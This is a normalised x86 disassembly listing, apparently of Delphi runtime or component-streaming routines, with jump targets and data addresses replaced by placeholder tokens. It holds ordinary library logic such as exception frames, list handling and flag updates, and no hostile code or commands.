cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41bba8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41875c
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41875c
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4185a4
sub_41bbe0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41875c
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41875c
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_4185f0
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4185a4
sub_41bc28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41bdc1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_418ac4
mov edi eax
xor edx edx
push ebp
push sub_41bda2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bda9
mov eax [ rw-data ]
call sub_418b28
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41bd83
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41bd31
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_418700
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4180c0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd38
mov eax [ ebp - 0x8 ]
call sub_403128
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_414bd0
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41bba8
pop ecx
mov edx esi
mov eax edi
call sub_4185f0
mov eax ebx
call sub_403128
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41bae0
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41bbe0
pop ecx
inc esi
sub_41bd38
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403128
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418700
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_41bdd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418ac4
mov edi eax
xor eax eax
push ebp
push sub_41be6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418b28
retn
mov edx ebx
mov eax edi
call sub_418700
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4185f0
mov eax esi
call sub_403128
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407e74
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41be7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418ac4
mov edi eax
xor eax eax
push ebp
push sub_41bef3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418b28
retn
mov edx ebx
mov eax edi
call sub_418700
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4185f0
mov eax esi
call sub_403128
sub_41bf24
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
pop ecx
pop edx
pop ebx
retn
sub_41bf68
push ebx
push esi
push edi
call sub_4034f4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b8a8
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_41bfa4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41de7c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41df8c
call sub_41bf18
sub_41bfc8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407e74
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403eb8
sub_41bffc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407e74
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41de7c
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c0bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41c440
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41c440
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c0c4
mov eax [ ebp - 0x8 ]
call sub_403128
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41df8c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41bf18
sub_41c0ec
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41c10c
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404154
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4033ac
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41bf18
sub_41c174
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_418ac4
mov esi eax
xor edx edx
push ebp
push sub_41c1e4
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c1eb
mov eax [ rw-data ]
call sub_418b28
retn
mov edx ebx
mov eax esi
call sub_418700
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403128
mov edx ebx
mov eax esi
call sub_4185f0
sub_41c1f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c2ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c306
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
xor edx edx
push ebp
push sub_41c2e2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c334
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41ba04
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418700
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403f50
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41bae0
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418700
call sub_41c174
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418700
mov edx eax
mov eax [ rw-data ]
call sub_418a3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_41884c
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41c310
push ebx
mov ebx eax
mov eax ebx
call sub_41c404
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41ae08
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41c334
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403128
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_418700
call sub_403128
inc edi
dec esi
jne r-xdata
sub_41c370
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_403070
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_417b8c
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4030b4
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_417c04
mov edi eax
mov edx [ esp + 0x4 ]
call sub_417b04
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_40308c
test al al
jne r-xdata
sub_41c440
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41c48c
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41c48c
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
sub_41c4dc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c527
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41dcdc
mov eax [ ebp - 0x4 ]
call sub_404178
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c52e
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
call sub_41bf18
sub_41c534
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41c5d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c0d8
test al al
jne r-xdata
mov eax ebx
call sub_41c0d8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419464
jmp r-xdata
mov eax ebx
call sub_41c41c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41d044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c5db
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_419398
mov esi eax
mov eax ebx
call sub_41d03c
jmp r-xdata
mov eax ebx
call sub_41cf8c
mov eax ebx
call sub_41c0d8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41d1a8
mov eax ebx
call sub_41d044
sub_41c604
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f0c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_4185a4
inc esi
dec ebx
jne r-xdata
sub_41c640
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_42135c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f0c
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050c8
add esp 0x4
mov edx ebx
mov eax edi
call sub_421330
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f0c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_421330
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41c6b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f0c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41c720
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41c740
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40275c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41c720
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41e170
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403128
sub_41c7a0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c886
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41e310
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41c85a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c88b
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c740
pop ecx
test al al
jne r-xdata
call sub_403970
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_40391c
sub_41c8b0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c928
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403324
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_4180c0
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c92d
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c740
pop ecx
test al al
jne r-xdata
call sub_403970
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_40391c
sub_41c950
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c9cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41e310
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403324
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c9d0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c740
pop ecx
test al al
jne r-xdata
call sub_403970
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_40391c
sub_41c9f4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41cc15
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41dca0
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41dca0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41cbe5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41cba3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c640
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c6b8
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41c7a0
pop ecx
push ebp
call sub_41c950
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41c8b0
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_4039a0
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c6b8
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41c6b8
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc1c
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4050d4
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403324
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41875c
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c604
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4185a4
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c604
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4185a4
sub_41cba8
push ebp
call sub_41c720
pop ecx
test al al
je r-xdata
call sub_40391c
call sub_403970
xor eax eax
pop edx
pop ecx
pop ecx
